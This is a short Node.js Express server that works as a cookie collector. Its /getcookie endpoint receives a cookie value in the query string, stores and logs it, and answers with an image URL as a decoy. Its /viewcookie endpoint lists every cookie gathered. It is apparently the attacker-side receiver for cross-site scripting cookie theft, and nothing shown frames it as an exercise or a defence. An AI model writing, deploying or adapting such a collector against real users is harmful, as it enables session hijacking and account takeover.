"use strict";

const express = require("express");
const app = express();
const port = process.env.PORT || 4000;

const user_cookies = [];

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.get("/getcookie", (req, res) => {
  user_cookies.push(req.query.cookie);
  console.log(req.query.cookie);
  res.send(
    "https://cdn.pixabay.com/photo/2022/04/05/14/13/flower-7113735_1280.jpg"
  );
});

app.get("/viewcookie", (req, res) => {
  res.json(user_cookies);
});

app.listen(port, () => {
  console.log(`server is listening on port ${port}`);
});
